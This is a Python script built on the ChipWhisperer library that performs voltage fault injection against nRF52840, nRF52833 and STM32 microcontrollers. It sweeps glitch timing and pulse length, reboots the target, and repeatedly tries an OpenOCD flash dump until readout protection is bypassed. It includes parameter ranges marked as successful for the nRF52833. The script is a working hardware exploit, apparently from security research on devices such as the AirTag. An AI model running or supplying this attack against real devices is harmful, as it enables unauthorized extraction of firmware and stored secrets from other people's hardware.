import chipwhisperer as cw
import time
import serial
import os
import argparse

SCOPETYPE = 'OPENADC'
PLATFORM = 'NOTHING'

def target_reset(_scope):
    _scope.io.nrst = 'low'
    time.sleep(0.05)
    _scope.io.nrst = 'high_z'
    time.sleep(0.05)

def vglitch_reset(_scope, _delay=0.005):
    # Reset the glitching module.
    """
    """
    hp = _scope.io.glitch_hp
    lp = _scope.io.glitch_lp
    _scope.io.glitch_hp = False
    _scope.io.glitch_lp = False
    time.sleep(_delay)
    _scope.io.glitch_hp = hp
    _scope.io.glitch_lp = lp

## Function to reboot the Target MCU
def reboot_flush(_scope, _reset_option):
    # global scope
    if _reset_option == 'vdd':
        _scope.io.target_pwr = False # Switch off the device
        # Wait for the AirTag to finish powering off (it has a lot of capacitance)
        # Wait for the capacitors to be discharged
        # Delay Before Powering up the Target
        # time.sleep(0.7) # There is a lot of capacitance on the AirTag, so we have to wait a bit for the powering off.
        time.sleep(0.1)
        _scope.arm()
        _scope.io.target_pwr = True # Switch on the device
    elif _reset_option == 'rst':
        _scope.io.nrst = 'low'
        time.sleep(0.1)
        _scope.arm()
        _scope.io.nrst = 'high_z'

def parse_arguments():
    """Parse command-line arguments."""
    # Create argument parser
    parser = argparse.ArgumentParser(description="Script with input parameters -i, -d, and an optional -a")
    parser.add_argument("-i", choices=['jlink', 'stlink'], help="Choose between 'link' and 'stlink'", required=True)
    parser.add_argument("-d", choices=['nrf52840', 'nrf52833', 'stm32'], help="Choose between 'nrf52840', 'nrf52833' and 'stm32'", required=True)
    parser.add_argument("-r", choices=['vdd', 'rst'], help="Choose between 'VDD: Control Target's VDD Line' and 'RST: Control Target's RESET pin' - Default is 'vdd'")
    parser.add_argument("-a", choices=['vfi', 'emfi'], help="Choose between 'Voltage Fault Injection Glitch' and 'ElectroMagnetic Fault Injection Glitch' - Default is 'vfi'")
    # Parse the arguments & return
    return parser.parse_args()

def main():
    # Pare input arguments & Prepare required links
    args = parse_arguments()

    # Access the arguments
    interface_option = args.i
    device_option = args.d
    reset_option = args.r
    attack_option = args.a

    # Check if both options are provided
    if interface_option is None or device_option is None:
        print("Both -i and -d parameters are required.")
        return

    # Print chosen options
    print("Chosen interface option:", interface_option)
    print("Chosen target option:", device_option)
    if reset_option:
        print("Chosen reset type:", reset_option)
    else:
        reset_option = 'vdd'
        print("Default reset type:", reset_option)
    if attack_option:
        print("Chosen attack type:", attack_option)
    else:
        attack_option = 'vfi'
        print("Default attack type:", attack_option)

    #########################################################
    # Start of ChipWhisperer Lite Script

    # disable logging
    cw.set_all_log_levels(cw.logging.CRITICAL)

    # ------------------------------
    # Initiate Connection to the Chipwhisperer Lite Kit
    print("Connecting to CW_Lite.")
    scope = cw.scope()
    try:
        if not scope.connectStatus:
            scope.con()
    except NameError:
        scope = cw.scope()
    print("INFO: Found ChipWhisperer😍")
    time.sleep(0.05)
    # scope.default_setup()

    scope.clock.clkgen_freq = 100E6
    scope.glitch.clk_src="clkgen"
    scope.glitch.output = "enable_only"
    scope.glitch.trigger_src = "ext_single"
    if reset_option == 'vdd':
        scope.trigger.triggers = "tio4"
        scope.adc.basic_mode = 'rising_edge'
        print('scope.adc.basic_mode: ' + scope.adc.basic_mode)
    elif reset_option == 'rst':
        scope.io.target_pwr = True
        scope.trigger.triggers = 'nrst' #"nrst"
        scope.adc.basic_mode = 'rising_edge'

    # scope.glitch.arm_timing = "before_scope" ### ????

    scope.io.glitch_lp = True
    scope.io.glitch_hp = True

    # scope.adc.samples = 1 ### ???

    # gc = cw.GlitchController(groups=["success", "reset", "normal"], parameters=["repeat", "ext_offset"])
    gc = cw.GlitchController(groups=["success", "reset", "normal"], parameters=["ext_offset", "repeat"])
    gc.set_global_step(1)
    # gc.set_range("repeat", 5, 20)              # Length of the glitch pulse
    # gc.set_range("repeat", 1, 50)              # Length of the glitch pulse
    # gc.set_range("ext_offset", 102500, 104500)  # Time after trigger to glitch, in CW clock cycles.
    # gc.set_step("ext_offset", 100)
    # gc.set_step("ext_offset", 10)
    # gc.set_range("ext_offset", 103000, 104500)  # Time after trigger to glitch, in CW clock cycles.
    # gc.set_range("ext_offset", 103500, 104500)  # Time after trigger to glitch, in CW clock cycles.
    # gc.set_range("ext_offset", 104500, 104600)  # Time after trigger to glitch, in CW clock cycles.
    # gc.set_range("ext_offset", 105000, 105400)  # Time after trigger to glitch, in CW clock cycles.
    # gc.set_range("ext_offset", 106000, 107000)  # Time after trigger to glitch, in CW clock cycles.
    # gc.set_range("ext_offset", 116000, 117000)  # Time after trigger to glitch, in CW clock cycles.
    # gc.set_range("repeat", 12, 50)              # Length of the glitch pulse
    # gc.set_step("ext_offset", 10)
    # gc.set_step("ext_offset", 1)

    # gc.set_range("ext_offset", 103000, 107000)  # Time after trigger to glitch, in CW clock cycles.
    gc.set_range("ext_offset", 110000, 130000)  # Time after trigger to glitch, in CW clock cycles. # successful for nRF52833
    # gc.set_range("repeat", 100, 8190)              # Length of the glitch pulse
    gc.set_range("repeat", 5000, 8190)              # Length of the glitch pulse    # successful for nRF52833
    # gc.set_range("repeat", 100, 60000)              # Length of the glitch pulse
    gc.set_step("repeat", 50)
    gc.set_step("ext_offset", 50)

    fulllog_fn = 'logs/log-' + time.strftime("%Y%m%d-%H%M%S") + '.txt'

    for glitch_setting in gc.glitch_values():
        # Prepare glitch parameters
        # scope.glitch.repeat = glitch_setting[0]
        # scope.glitch.ext_offset = glitch_setting[1]
        scope.glitch.ext_offset = glitch_setting[0]
        scope.glitch.repeat = glitch_setting[1]

        # scope.glitch.ext_offset = 102500
        # scope.glitch.repeat = 2

        # Reboot the Target & arm the scope
        reboot_flush(scope, reset_option)

        time.sleep(0.15)
        timestr = time.strftime("%Y%m%d-%H%M%S")
        # binfilename = 'logs/nrf52_flash' + timestr + '.bin'
        # openocd_str = 'openocd -f ./openocd/nrf52840.cfg -c "init;dump_image ' + binfilename + ' 0x0 0x80000;exit"'
        dumpfilename = 'logs/' + device_option + '_flashDump' + timestr + '.bin'
        openocd_str = 'openocd -f ./openocd/' + device_option + '_' + interface_option + '.cfg -c "init;dump_image ' + dumpfilename + ' 0x0 0x80000;exit"'

        print('dumpfilename: ' + dumpfilename)
        print('openocd_str: ' + openocd_str)
    
        exit_status = os.system(openocd_str)
        fulllog = open(fulllog_fn, 'a')
        fulllog.write(openocd_str + "\n")
        # print(f"repeat: {scope.glitch.repeat}, ext_offset: {scope.glitch.ext_offset}")
        print(f"ext_offset: {scope.glitch.ext_offset}, repeat: {scope.glitch.repeat}")
        print("exit_status: " + str(exit_status))
        print("*-----------------------------------*")
        if exit_status == 0:
            print("SUCCESS")
            filename = 'log-' + timestr + '.txt'
            f = open(filename, 'a')
            f.write(f"SUCCESS Paramters: repeat: {scope.glitch.repeat}, ext_offset: {scope.glitch.ext_offset}\n")
            f.close()
            fulllog.write(f"SUCCESS Paramters: repeat: {scope.glitch.repeat}, ext_offset: {scope.glitch.ext_offset}\n")
            fulllog.close()
            break
        else:
            os.system('rm ' + dumpfilename)
        # Reset the glitching module. Things break if you don't do this.
        time.sleep(0.05)
        vglitch_reset(scope)

if __name__ == "__main__":
    main()